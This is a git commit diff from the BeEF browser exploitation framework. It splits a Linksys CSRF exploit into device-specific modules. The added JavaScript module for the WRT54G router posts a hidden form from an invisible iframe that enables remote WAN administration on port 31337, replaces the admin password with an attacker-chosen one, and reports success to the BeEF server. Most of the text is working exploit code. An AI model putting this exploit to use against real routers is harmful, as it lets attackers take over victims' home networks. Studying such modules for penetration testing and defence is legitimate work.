3f0fc4dd9e24b9ffd64c6055c33fea5540705198
wade@bindshell.net <wade@bindshell.net@b87d56ec-f9c0-11de-8c8a-61c5e9addfc9>
2010-12-21 04:54:30 +0000

    Linksys exploit module split into separate modules targeting individual devices.
    git-svn-id: https://beef.googlecode.com/svn/trunk@625 b87d56ec-f9c0-11de-8c8a-61c5e9addfc9

--- modules/commands/network/linksys_wrt54g2_csrf/wrt54g2_csrf.rb
+++ modules/commands/network/linksys_wrt54g2_csrf/wrt54g2_csrf.rb
@@ -3,15 +3,15 @@ module Modules
 module Commands
 
 
-class Linksys_csrf < BeEF::Command
+class Wrt54g2_csrf < BeEF::Command
   
   #
   # Defines and set up the command module.
   #
   def initialize
     super({
-      'Name' => 'Linksys CSRF Exploit',
-      'Description' => 'Attempts to enable remote administration and change the password on a linksys router.',
+      'Name' => 'Linksys WRT54G2 CSRF Exploit',
+      'Description' => 'Attempts to enable remote administration and change the password on a Linksys WRT54G2 router.',
       'Category' => 'Network',
       'Author' => 'Martin Barbella',
       'Data' => [['name' => 'base', 'ui_label' => 'Router web root', 'value' => 'http://arbitrary:admin@192.168.1.1/'], ['name' => 'port', 'ui_label' => 'Desired port', 'value' => '31337'], ['name' => 'password', 'ui_label' => 'Desired password', 'value' => '__BeEF__']],
@@ -25,7 +25,6 @@ class Linksys_csrf < BeEF::Command
     
     use_template!
   end
-  
   
   def callback
     save({'result' => @datastore['result']})
---
+++ modules/commands/network/linksys_wrt54g_csrf/wrt54g_csrf.js
@@ -0,0 +1,92 @@
+beef.execute(function() {
+  var port = '<%= @port %>';
+  var gateway = '<%= @base %>'; 
+  var passwd = '<%= @password %>';
+
+  var target = gateway + "manage.tri";
+
+  var iframe = beef.dom.createInvisibleIframe();
+
+  var form = document.createElement('form');
+  form.setAttribute('action', target);
+  form.setAttribute('method', 'post');
+
+  var input = null;
+
+  input = document.createElement('input');
+  input.setAttribute('type', 'hidden');
+  input.setAttribute('name', 'remote_mgt_https');
+  input.setAttribute('value', 0);
+  form.appendChild(input);
+
+  input = document.createElement('input');
+  input.setAttribute('type', 'hidden');
+  input.setAttribute('name', 'http_enable');
+  input.setAttribute('value', 1);
+  form.appendChild(input);
+
+  input = document.createElement('input');
+  input.setAttribute('type', 'hidden');
+  input.setAttribute('name', 'https_enable');
+  input.setAttribute('value', 0);
+  form.appendChild(input);
+
+  input = document.createElement('input');
+  input.setAttribute('type', 'hidden');
+  input.setAttribute('name', 'PasswdModify');
+  input.setAttribute('value', 1);
+  form.appendChild(input);
+
+  input = document.createElement('input');
+  input.setAttribute('type', 'hidden');
+  input.setAttribute('name', 'http_passwd');
+  input.setAttribute('value', passwd);
+  form.appendChild(input);
+
+  input = document.createElement('input');
+  input.setAttribute('type', 'hidden');
+  input.setAttribute('name', 'http_passwdConfirm');
+  input.setAttribute('value', passwd);
+  form.appendChild(input);
+
+  input = document.createElement('input');
+  input.setAttribute('type', 'hidden');
+  input.setAttribute('name', '_http_enable');
+  input.setAttribute('value', 1);
+  form.appendChild(input);
+
+  input = document.createElement('input');
+  input.setAttribute('type', 'hidden');
+  input.setAttribute('name', 'web_wl_filter');
+  input.setAttribute('value', 1);
+  form.appendChild(input);
+
+  input = document.createElement('input');
+  input.setAttribute('type', 'hidden');
+  input.setAttribute('name', 'remote_management');
+  input.setAttribute('value', 1);
+  form.appendChild(input);
+
+  input = document.createElement('input');
+  input.setAttribute('type', 'hidden');
+  input.setAttribute('name', 'http_wanport');
+  input.setAttribute('value', port);
+  form.appendChild(input);
+
+  input = document.createElement('input');
+  input.setAttribute('type', 'hidden');
+  input.setAttribute('name', 'upnp_enable');
+  input.setAttribute('value', 1);
+  form.appendChild(input);
+
+  input = document.createElement('input');
+  input.setAttribute('type', 'hidden');
+  input.setAttribute('name', 'layout');
+  input.setAttribute('value', 'en');
+  form.appendChild(input);
+
+  iframe.contentWindow.document.body.appendChild(form);
+  form.submit();
+
+  beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
+});
